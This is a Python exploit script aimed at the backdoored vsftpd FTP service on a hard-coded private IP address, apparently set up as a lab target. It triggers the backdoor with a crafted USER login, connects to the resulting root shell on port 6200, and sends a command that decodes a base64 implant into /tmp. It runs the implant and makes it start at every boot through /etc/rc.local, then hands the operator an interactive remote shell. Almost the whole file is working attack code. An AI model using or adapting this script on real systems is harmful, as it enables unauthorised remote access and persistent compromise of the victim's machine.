import socket
import time
import base64

TARGET = '172.19.0.3'   # Victim's IP address
FTP_PORT = 21
SHELL_PORT = 6200

def trigger_backdoor():
    print("[*] Connecting to vsftpd...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, FTP_PORT))
    banner = s.recv(1024)
    print("[+] FTP Banner:", banner.decode())
    s.send(b'USER testuser:)\r\n')
    time.sleep(1)
    s.send(b'PASS whatever\r\n')
    s.close()

def upload_implant():
    print("[*] Reading implant file from /code/implant.py...")
    with open("/code/implant.py", "rb") as f:
        implant_data = f.read()
    b64_data = base64.b64encode(implant_data).decode('utf-8')
    print("[*] Base64 encoded implant size:", len(b64_data))
    cmd = (
        "echo '{}'>/tmp/implant.b64 2>/tmp/implant.log;".format(b64_data) +
        "base64 -d /tmp/implant.b64 >/tmp/implant.py 2>>/tmp/implant.log;" +
        "chmod +x /tmp/implant.py 2>>/tmp/implant.log;" +
        "grep -qxF 'python3 /tmp/implant.py &' /etc/rc.local || echo 'python3 /tmp/implant.py &' >> /etc/rc.local 2>>/tmp/implant.log;" +
        "python3 /tmp/implant.py >>/tmp/implant.log 2>&1 &"
    )
    return cmd

def connect_shell():
    cmd = upload_implant()
    print("[*] Connecting to backdoor shell on port {}...".format(SHELL_PORT))
    time.sleep(2)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, SHELL_PORT))
    print("[+] Connected. Sending implant upload command...")
    s.send(cmd.encode() + b'\n')
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            print(data.decode(), end='')
            user_input = input("")
            s.send(user_input.encode() + b'\n')
    except Exception as e:
        print("Connection error:", e)
    finally:
        s.close()

if __name__ == "__main__":
    trigger_backdoor()
    connect_shell()
